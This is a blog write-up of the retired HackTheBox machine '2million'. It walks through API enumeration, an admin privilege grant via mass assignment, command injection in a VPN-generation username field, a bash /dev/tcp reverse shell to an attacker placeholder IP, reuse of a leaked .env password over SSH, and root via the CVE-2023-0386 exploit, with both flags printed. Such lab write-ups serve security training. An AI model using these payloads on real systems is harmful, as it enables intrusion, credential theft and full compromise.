---
layout: post
title: "2million"
date: 2025-10-20
---

## Challenge Description
This is a retired HTB machine called 2million. Its a cool Machine to pwn.

## Solution
```
nmap 10.10.11.221

Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-15 09:12 CEST
Nmap scan report for 10.10.11.221
Host is up (0.057s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 0.96 seconds
```

By looking at the website and the js code we have found that there is a page that ask you a verification code in order to register.

```
python dirsearch.py -u http://2million.htb/

Target: http://2million.htb/

[11:14:27] Scanning: 
[11:14:31] 301 -   162B - /0  ->  http://2million.htb/404                   
[11:14:31] 301 -   162B - /04  ->  http://2million.htb/404                  
[11:14:31] 301 -   162B - /2  ->  http://2million.htb/404                   
[11:14:31] 301 -   162B - /4  ->  http://2million.htb/404                   
[11:14:31] 301 -   162B - /40  ->  http://2million.htb/404                  
[11:14:31] 200 -    2KB - /404                                              
[11:14:36] 401 -     0B - /api                                              
[11:14:36] 401 -     0B - /api/v1                                           
[11:14:36] 403 -   548B - /assets/                                          
[11:14:36] 301 -   162B - /assets  ->  http://2million.htb/assets/          
[11:14:37] 301 -   162B - /b  ->  http://2million.htb/404                   
[11:14:39] 403 -   548B - /controllers/                                     
[11:14:39] 301 -   162B - /css  ->  http://2million.htb/css/                
[11:14:41] 301 -   162B - /fonts  ->  http://2million.htb/fonts/            
[11:14:41] 301 -   162B - /h  ->  http://2million.htb/404                   
[11:14:41] 302 -     0B - /home  ->  /                                      
[11:14:41] 301 -   162B - /i  ->  http://2million.htb/404                   
[11:14:42] 301 -   162B - /images  ->  http://2million.htb/images/          
[11:14:42] 403 -   548B - /images/                                          
[11:14:42] 301 -   162B - /js  ->  http://2million.htb/js/                  
[11:14:42] 403 -   548B - /js/
[11:14:42] 301 -   162B - /l  ->  http://2million.htb/404                   
[11:14:43] 200 -    4KB - /login                                            
[11:14:43] 302 -     0B - /logout  ->  /                                                                                          
[11:14:43] 301 -   162B - /m  ->  http://2million.htb/404                                                                         
[11:14:44] 301 -   162B - /n  ->  http://2million.htb/404                                                                         
[11:14:45] 301 -   162B - /o  ->  http://2million.htb/404                                                                         
[11:14:45] 301 -   162B - /p  ->  http://2million.htb/404                                                                         
[11:14:47] 200 -    4KB - /register                                                                                               
[11:14:50] 301 -   162B - /t  ->  http://2million.htb/404                                                                         
[11:14:51] 301 -   162B - /views  ->  http://2million.htb/views/                                                                  
                                                                                                                                  
Task Completed 
```

And if we take a better look we can find two endpoints from the javascript code:

`/api/v1/invite/verify`

`/api/v1/invite/how/to/generate`

If we capture the request with `burpsuite` for this endpoint `/api/v1/invite/verify` we can craft another request to make it point to the `/api/v1/invite/how/to/generate` endpoint.

This is the response:

```
{"0":200,"success":1,"data":{"data":"Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb \/ncv\/i1\/vaivgr\/trarengr","enctype":"ROT13"},"hint":"Data is encrypted ... We should probbably check the encryption type in order to decrypt it..."}


Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb \/ncv\/i1\/vaivgr\/trarengr

ROT13
```

If we decrypt it we got this in clear:

`In order to generate the invite code, make a POST request to \/api\/v1\/invite\/generate`

So lets make a request to this endpoint with `Burpsuite`.

`{"0":200,"success":1,"data":{"code":"NlNYQzgtMzlPVU0tMDdDRzAtMktGSzA=","format":"encoded"}}`

If we decode this `NlNYQzgtMzlPVU0tMDdDRzAtMktGSzA=` in `base64` we retrive the code that allows us to continue the registration:

`6SXC8-39OUM-07CG0-2KFK0`

Once registered, i runned again `dirsearch` with authentication this time. I found out these endpoints:

```
Target: http://2million.htb/

[14:11:02] Scanning:                                                                                                             
[14:11:05] 301 -   162B - /0  ->  http://2million.htb/404                   
[14:11:05] 301 -   162B - /04  ->  http://2million.htb/404                  
[14:11:05] 301 -   162B - /2  ->  http://2million.htb/404                   
[14:11:06] 301 -   162B - /4  ->  http://2million.htb/404                   
[14:11:06] 301 -   162B - /40  ->  http://2million.htb/404                  
[14:11:06] 200 -    2KB - /404                                              
[14:11:06] 200 -  142KB - /js/htb-frontend.min.js                           
[14:11:10] 401 -     0B - /api                                              
[14:11:10] 401 -     0B - /api/v1                                           
[14:11:10] 301 -   162B - /assets  ->  http://2million.htb/assets/          
[14:11:10] 403 -   548B - /assets/                                          
[14:11:10] 301 -   162B - /b  ->  http://2million.htb/404                   
[14:11:13] 403 -   548B - /controllers/                                     
[14:11:13] 301 -   162B - /css  ->  http://2million.htb/css/                
[14:11:15] 301 -   162B - /fonts  ->  http://2million.htb/fonts/            
[14:11:16] 301 -   162B - /h  ->  http://2million.htb/404                   
[14:11:16] 302 -     0B - /home  ->  /                                      
[14:11:16] 301 -   162B - /i  ->  http://2million.htb/404                   
[14:11:16] 403 -   548B - /images/                                          
[14:11:16] 301 -   162B - /images  ->  http://2million.htb/images/          
[14:11:17] 301 -   162B - /js  ->  http://2million.htb/js/                  
[14:11:17] 403 -   548B - /js/
[14:11:17] 301 -   162B - /l  ->  http://2million.htb/404                   
[14:11:18] 200 -    4KB - /login                                            
[14:11:18] 405 -     0B - /api/v1/user/login                                
[14:11:18] 302 -     0B - /logout  ->  /                                    
[14:11:18] 301 -   162B - /m  ->  http://2million.htb/404                   
[14:11:20] 301 -   162B - /n  ->  http://2million.htb/404                   
[14:11:20] 301 -   162B - /o  ->  http://2million.htb/404                   
[14:11:20] 301 -   162B - /p  ->  http://2million.htb/404                   
[14:11:22] 200 -    4KB - /register                                         
[14:11:23] 200 -   637B - /js/inviteapi.min.js                              
[14:11:23] 405 -     0B - /api/v1/user/register                             
[14:11:25] 301 -   162B - /t  ->  http://2million.htb/404                   
[14:11:27] 301 -   162B - /views  ->  http://2million.htb/views/            
                                                                             
Task Completed 
```

At this endpoint `/api/v1` i got this json as response:

```
v1	
user	
GET	
/api/v1	"Route List"
/api/v1/invite/how/to/generate	"Instructions on invite code generation"
/api/v1/invite/generate	"Generate invite code"
/api/v1/invite/verify	"Verify invite code"
/api/v1/user/auth	"Check if user is authenticated"
/api/v1/user/vpn/generate	"Generate a new VPN configuration"
/api/v1/user/vpn/regenerate	"Regenerate VPN configuration"
/api/v1/user/vpn/download	"Download OVPN file"
POST	
/api/v1/user/register	"Register a new user"
/api/v1/user/login	"Login with existing user"
admin	
GET	
/api/v1/admin/auth	"Check if user is admin"
POST	
/api/v1/admin/vpn/generate	"Generate VPN for specific user"
PUT	
/api/v1/admin/settings/update	"Update user settings"
```

By taking a look at the response from these endpoints we are able to retrive usefull information for crafting the next requests. I tried to make a request to this endpoint `/api/v1/admin/settings/update` and i got this as response:

```
curl -i -X PUT "http://2million.htb/api/v1/admin/settings/update"   -H "Content-Type: application/json"   --cookie "PHPSESSID=vssrfnuq1abdr49f15ol3crica"   -d '{"loggedin":true,"username":"asd","is_admin":1}'

HTTP/1.1 200 OK
Server: nginx
Date: Sat, 18 Oct 2025 12:28:59 GMT
Content-Type: application/json
Transfer-Encoding: chunked
Connection: keep-alive
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache

{"status":"danger","message":"Missing parameter: email"}
```

We are close! Now we know that we are reaching something but it is expecting an email as parameter of authentication so lets make some changes to the previous curl request. Lets use the email of our account and lets say that we want to become admin.

```
curl -i -X PUT "http://2million.htb/api/v1/admin/settings/update"   -H "Content-Type: application/json"   --cookie "PHPSESSID=vssrfnuq1abdr49f15ol3crica"   -d '{"email":"asd@asd.com","is_admin":1}'

HTTP/1.1 200 OK
Server: nginx
Date: Sat, 18 Oct 2025 12:30:54 GMT
Content-Type: application/json
Transfer-Encoding: chunked
Connection: keep-alive
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache

{"id":18,"username":"asd","is_admin":1}
```

Nice! We made it, now we are Admin! We can also check if everything went well by sending a request at `/api/v1/admin/auth`. Now we can look at the other admin endpoints that we retrived previously.

If we capture the request when downloading the vpn from the website and we change it:

```
POST /api/v1/admin/vpn/generate HTTP/1.1

Host: 2million.htb
Content-Length: 56
X-Requested-With: XMLHttpRequest
Accept-Language: en-US,en;q=0.9
Accept: application/json, text/javascript, */*; q=0.01
Content-Type: application/json
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
Origin: http://2million.htb
Referer: http://2million.htb/home/access
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=vssrfnuq1abdr49f15ol3crica
Connection: keep-alive

{
    "loggedin":true,
    "username":"asd",
    "is_admin":0
}

HTTP/1.1 200 OK
Server: nginx
Date: Sat, 18 Oct 2025 13:00:53 GMT
Content-Type: text/html; charset=UTF-8
Connection: keep-alive
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 10811

client
dev tun
proto udp
remote edge-eu-free-1.2million.htb 1337
resolv-retry infinite
nobind
persist-key
persist-tun
remote-cert-tls server
comp-lzo
verb 3
data-ciphers-fallback AES-128-CBC
data-ciphers AES-256-CBC:AES-256-CFB:AES-256-CFB1:AES-256-CFB8:AES-256-OFB:AES-256-GCM
tls-cipher "DEFAULT:@SECLEVEL=0"
auth SHA256
key-direction 1
...
```

Lets try to inject some command in the `username` field:

```
POST /api/v1/admin/vpn/generate HTTP/1.1
Host: 2million.htb
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://2million.htb/home/access
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=vssrfnuq1abdr49f15ol3crica
Connection: keep-alive
Content-Length: 61
Content-Type: application/json

{
    "loggedin":true,
    "username":"asd; id;",
    "is_admin":0
}

HTTP/1.1 200 OK
Server: nginx
Date: Sat, 18 Oct 2025 13:08:54 GMT
Content-Type: text/html; charset=UTF-8
Connection: keep-alive
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 54

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

We can see that we can perform RCE. Lets retrive a reverse shell payload online and lets craft the request:

```
POST /api/v1/admin/vpn/generate HTTP/1.1
Host: 2million.htb
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://2million.htb/home/access
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=vssrfnuq1abdr49f15ol3crica
Connection: keep-alive
Content-Length: 99
Content-Type: application/json

{
    "loggedin":true,
    "username":"asd; bash -c 'bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1' ;",
    "is_admin":0
}
```

And on another terminal lets run:

`nc -lvnp <PORT>`

Nice we are in!

```
www-data@2million:$ find / -group www-data -type f 2>/dev/null

/var/www/html/VPN/private/index.txt.old
/var/www/html/VPN/private/serial.txt.old
/var/www/html/VPN/private/02.pem
/var/www/html/VPN/private/01.pem
/var/www/html/VPN/private/index.txt.attr.old
/var/www/html/VPN/private/serial.txt
/var/www/html/VPN/private/index.txt.attr
/var/www/html/VPN/private/index.txt
/var/www/html/VPN/user/asd.crt
/var/www/html/VPN/user/asd.cnf
/var/www/html/VPN/user/asd.ovpn
/var/www/html/VPN/user/asd.key
/var/www/html/VPN/user/asd.csr
/tmp/testing/CVE-2023-0386-main/fuse.c
/tmp/testing/CVE-2023-0386-main/ovlcap/.gitkeep
/tmp/testing/CVE-2023-0386-main/Makefile
/tmp/testing/CVE-2023-0386-main/exp.c
/tmp/testing/CVE-2023-0386-main/test/mnt
/tmp/testing/CVE-2023-0386-main/test/fuse_test.c
/tmp/testing/CVE-2023-0386-main/test/mnt.c
/tmp/testing/CVE-2023-0386-main/README.md
/tmp/testing/CVE-2023-0386-main/getshell.c
/tmp/testing/CVE-2023-0386-main.zip
/tmp/result.txt
/tmp/test
```

```
www-data@2million:~/html$ cat index.php 
cat index.php
<?php 

session_start();

//error_reporting(E_ALL);
//ini_set('display_errors',1);

spl_autoload_register(function ($name){
    if (preg_match('/Controller$/', $name))
    {
        $name = "controllers/${name}";
    }
    else if (preg_match('/Model$/', $name))
    {
        $name = "models/${name}";
    }
    include_once "${name}.php";
});

$envFile = file('.env');
$envVariables = [];
foreach ($envFile as $line) {
    $line = trim($line);
    if (!empty($line) && strpos($line, '=') !== false) {
        list($key, $value) = explode('=', $line, 2);
        $key = trim($key);
        $value = trim($value);
        $envVariables[$key] = $value;
    }
}


$dbHost = $envVariables['DB_HOST'];
$dbName = $envVariables['DB_DATABASE'];
$dbUser = $envVariables['DB_USERNAME'];
$dbPass = $envVariables['DB_PASSWORD'];


$database = new Database($dbHost, $dbUser, $dbPass, $dbName);
$database->connect();

$router = new Router();

// Home Routes
$router->new('GET', '/', 'HomeController@index');

$router->new('GET', '/invite', 'HomeController@invite');
$router->new('GET', '/register', 'AuthController@get_register');
$router->new('GET', '/login', 'AuthController@get_login');
$router->new('GET', '/logout', 'AuthController@logout');
$router->new('GET', '/404', 'HomeController@not_found');

$router->new('GET', '/home', 'HomeController@home');
$router->new('GET', '/home/changelog', 'HomeController@change_log');
$router->new('GET', '/home/access', 'HomeController@access');
$router->new('GET', '/home/rules', 'HomeController@rules');

// API Routes
$router->new('GET', '/api', 'APIController@get_version');
$router->new('GET', '/api/v1', 'APIController@get_routes');

$router->new('POST', '/api/v1/invite/how/to/generate', 'InviteController@how_to_generate');
$router->new('POST', '/api/v1/invite/generate', 'InviteController@generate');
$router->new('POST', '/api/v1/invite/verify', 'InviteController@verify');

$router->new('GET', '/api/v1/user/auth', 'AuthController@is_authenticated');
$router->new('POST', '/api/v1/user/register', 'AuthController@post_register');
$router->new('POST', '/api/v1/user/login', 'AuthController@post_login');

$router->new('GET', '/api/v1/user/vpn/generate', 'VPNController@generate_user_vpn');
$router->new('GET', '/api/v1/user/vpn/regenerate', 'VPNController@regenerate_user_vpn');
$router->new('GET', '/api/v1/user/vpn/download', 'VPNController@generate_user_vpn');

$router->new('GET', '/api/v1/admin/auth', 'AdminController@is_admin');
$router->new('POST', '/api/v1/admin/vpn/generate', 'VPNController@admin_vpn');
$router->new('PUT', '/api/v1/admin/settings/update', 'AdminController@update_settings');

$response = $router->match();

die($response);
```

Lets look for `env` variables or `.env` files.

```
www-data@2million:~/html$ find / -type f -name ".env" 2>/dev/null
/var/www/html/.env

www-data@2million:~/html$ cat /var/www/html/.env
DB_HOST=127.0.0.1
DB_DATABASE=htb_prod
DB_USERNAME=admin
DB_PASSWORD=SuperDuperPass123
```

Nice we got admin credentials!

```
ssh admin@2million.htb 
SuperDuperPass123

admin@2million:~$ cat user.txt 
c1f2244275866acab3d422930061f760
```

Now lets get root privilages!

```
find / -group admin -type f

/var/mail/admin

/tmp/CVE-2023-0386-main/fuse.c
/tmp/CVE-2023-0386-main/gc
/tmp/CVE-2023-0386-main/exp
/tmp/CVE-2023-0386-main/ovlcap/.gitkeep
/tmp/CVE-2023-0386-main/Makefile
/tmp/CVE-2023-0386-main/exp.c
/tmp/CVE-2023-0386-main/test/mnt
/tmp/CVE-2023-0386-main/test/fuse_test.c
/tmp/CVE-2023-0386-main/test/mnt.c
/tmp/CVE-2023-0386-main/README.md
/tmp/CVE-2023-0386-main/fuse
/tmp/CVE-2023-0386-main/getshell.c
```

```
admin@2million:~$ cat /var/mail/admin

From: ch4p <ch4p@2million.htb>
To: admin <admin@2million.htb>
Cc: g0blin <g0blin@2million.htb>
Subject: Urgent: Patch System OS
Date: Tue, 1 June 2023 10:45:22 -0700
Message-ID: <9876543210@2million.htb>
X-Mailer: ThunderMail Pro 5.2

Hey admin,

I'm know you're working as fast as you can to do the DB migration. While we're partially down, can you also upgrade the OS on our web host? There have been a few serious Linux kernel CVEs already this year. That one in OverlayFS / FUSE looks nasty. We can't get popped by that.

HTB Godfather
```

Ok se we have the confirmation that those files related to the `CVE-2023-0386` are hinting on how to perform the privilage escalation to root. Lets take a look at them.

```
admin@2million:/tmp/CVE-2023-0386-main$ ./exp
uid:1000 gid:1000
[+] mount success
total 8
drwxrwxr-x 1 root   root     4096 Oct 18 13:41 .
drwxrwxr-x 6 root   root     4096 Oct 18 13:41 ..
-rwsrwxrwx 1 nobody nogroup 16096 Jan  1  1970 file
[+] exploit success!
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

root@2million:/tmp/CVE-2023-0386-main# cat /root/root.txt 
dc59aa8b2db3a92dbc5447da876ead72
```

Nice we got it! We are root!
